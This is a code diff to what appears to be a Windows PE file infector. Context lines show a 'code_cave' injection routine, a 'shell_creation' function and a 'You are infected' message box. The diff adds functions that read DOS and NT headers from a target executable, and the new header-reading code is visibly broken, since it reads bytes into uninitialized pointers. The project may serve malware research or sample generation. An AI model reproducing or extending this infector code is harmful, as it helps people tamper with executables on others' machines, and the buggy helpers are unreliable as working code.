@@ -27,6 +27,47 @@ __declspec(naked) void code_cave(DWORD start_pt, DWORD difference_between_iohs, 
     }
 }
 
+int file_open(FILE* target_file) {
+    //initiate flags
+    PIMAGE_DOS_HEADER tmp_dos_header;
+    int is_pe_file = 0;
+
+    //file reading
+    fseek(target_file, 0, SEEK_SET);
+    fread(&tmp_dos_header, sizeof(PIMAGE_DOS_HEADER), 1, target_file);
+
+    //flags check
+    if (tmp_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
+        is_pe_file = -1;
+
+    //return flags
+    return is_pe_file;
+}
+
+PIMAGE_DOS_HEADER retrive_dos_header(FILE* pe_file) {
+    //initiate vars
+    PIMAGE_DOS_HEADER dos_header;
+
+    //file_reading
+    fseek(pe_file, 0, SEEK_SET);
+    fread(&dos_header, sizeof(PIMAGE_DOS_HEADER), 1, pe_file);
+
+    //return the header
+    return dos_header;
+}
+
+PIMAGE_NT_HEADERS retrieve_nt_headers(FILE* pe_file, PIMAGE_DOS_HEADER dos_header) {
+    //initiate vars
+    PIMAGE_NT_HEADERS nt_headers;
+
+    //file reading
+    fseek(pe_file, dos_header->e_lfanew, SEEK_SET);
+    fread(&nt_headers, sizeof(PIMAGE_NT_HEADERS), 1, pe_file);
+
+    //return the header
+    return nt_headers;
+}
+
 DWORD message_box()
 {
     int msg = MessageBox(NULL, (LPCWSTR)"You are infected", (LPCWSTR)"Warning", MB_OK);
@@ -44,39 +85,25 @@ void shell_creation(PIMAGE_NT_HEADERS nt_headers, DWORD message) {
 
 int main(int argc, char* argv[])
 {
-    //file uploading
+    //file initiating
     const int MAX_FILEPATH = 255;
-    char file_name[MAX_FILEPATH] = { "C:/benign/benign/00eea85752664955047caad7d6280bc7bf1ab91c61eb9a2542c26b747a12e963.exe" };
-    memcpy_s(&file_name, MAX_FILEPATH, argv[1], MAX_FILEPATH);
+    char file_name[MAX_FILEPATH] = { "C:\benign\benign\1aa177b92c99b9458b270907d65d5687af48385fbbf42c3aef9b69d61d284721.exe" }; //sample no26   
+    FILE* target_file;
+    fopen_s(&target_file, file_name, "rb"); 
+    if (target_file == NULL)
+        return -1;
 
     //variables initiating
-    HANDLE file = NULL;
-    DWORD file_size = NULL;
-    DWORD bytes_read = NULL;
-    LPVOID file_data = NULL;
     DWORD message = NULL;
     PIMAGE_DOS_HEADER dos_header = {};
     PIMAGE_NT_HEADERS image_nt_headers = {};
 
-
-    //file open
-    file = CreateFileA(file_name, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (file == INVALID_HANDLE_VALUE) {
-        cout << "Couldn't read file!";
-        return 1;
-    }
-
-    //heap allocation
-    file_size = GetFileSize(file, NULL);
-    file_data = HeapAlloc(GetProcessHeap(), 0, file_size);
-
-    //read file bytes to memory
-    bool flag = ReadFile(file, file_data, file_size, &bytes_read, NULL);
-    if (flag == false) return -1;
+    //file opening
+    bool flag = file_open(target_file);
 
     // get the necessary headers
-    dos_header = (PIMAGE_DOS_HEADER)file_data;
-    image_nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)file_data + dos_header->e_lfanew);
+    dos_header = retrive_dos_header(target_file);
+    image_nt_headers = retrieve_nt_headers(target_file, dos_header);
 
     //implement the shell creator
     message = message_box();
